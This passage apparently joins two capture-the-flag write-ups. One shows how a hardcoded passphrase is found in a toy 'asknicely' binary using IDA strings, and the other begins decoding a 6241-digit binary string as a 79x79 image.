for the flag!\nAnd attached is a file ‘asknicely’.\nSolution\nWhen you run asknicely it asks:\nexample% ./asknicely\nHow badly do you want the flag?\nNo matter how you respond it then says:\nAsk nicely...\nThen if you respond incorrectly it says:\nthat&#039;s not quite what I&#039;m lookng for.\nSo it’s clear that we need to find the right input/phrase that it’s looking for.\nSo I then disassembled the code and got the following:\n\n\n\nAfter looking through it, I noticed that after it tells me to ‘Ask nicely…’ it will either output “Good job, I’m so proud of you!” or “that’s not quite what I’m looking for”.\nAnd in the aGoodJobIMSoPro side you can also see:\ncall    _Z9give_flagNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; give_flag(std::string)\nSo it’s safe to assume that by getting the aGoodJobIMSoPro option it will output the flag\nBut we still need to find out the right input.\nSo if you look through fastcall main, you’ll notice a line that stands out:\nlea     rdx, aPrettyPrettyPr ; &quot;pretty pretty pretty pretty pretty plea&quot;...\nwhich seems like the Ask Nicely phrase we’re looking for\nSo if you dig a little deeper you get:\n.rodata:0000000000576030 aPrettyPrettyPr db &#039;pretty pretty pretty pretty pretty please with sprinkles and a ch&#039;\nwhich is close but not complete, so if you use shift+f12 in IDA to view the strings you’ll find:\n\nwhich seems like the right phrase, ‘pretty pretty pretty pretty pretty please with sprinkles and a cherry on top’.\nFlag\nSo if you run the asknicely program with the right inputs:\nexample% ./asknicely How badly do you want the flag?\nThis input doesn&#039;t matter Ask nicely…\n`pretty pretty pretty pretty pretty please with sprinkles and a cherry on top\nIt

I thought the next logical step would be to translate this from binary to text, but it produced absolutely nothing of worth, so I got stuck for a bit until one of my teammates Janky recommended that if the number of 1’s and 0’s were semiprime such that the number was a product of exactly 2 prime numbers, you could use the 1’s and 0’s to form an image usings 0’s as a black pixel, and 1’s and a white pixel. (Note, he got this  Arecibo message idea from www.youtube.com/watch because Vsauce is absolutely goated like that).\nSo I checked how many digits there were, and sure enough there were 6241 characters which is semi prime, and is the product of exactly 2 primes numbers, 79x79.
